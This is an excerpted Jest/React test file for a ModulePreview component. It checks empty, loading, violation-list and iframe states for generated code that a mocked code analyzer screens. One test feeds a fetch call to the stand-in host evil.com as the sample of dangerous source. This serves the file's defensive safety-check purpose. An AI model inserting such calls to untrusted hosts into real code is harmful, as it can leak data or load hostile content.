...
describe('ModulePreview', () => {
  ...
  it('renders empty state when source is empty string', () => {
    ...
    render(<ModulePreview source="" generationState="idle" />)
  ...
  it('renders loading skeleton when generationState is generating', () => {
    mockAnalyzeCode.mockReturnValue({ safe: true, violations: [] })
    render(<ModulePreview source="" generationState="generating" />)
  ...
  it('renders violation list when source contains dangerous code', () => {
    ...
    render(<ModulePreview source='fetch("http://evil.com")' generationState="previewing" />)
  ...
  it('renders iframe when source is safe', () => {
    mockAnalyzeCode.mockReturnValue({ safe: true, violations: [] })
    render(<ModulePreview source="function GeneratedWidget() {}" generationState="previewing" />)
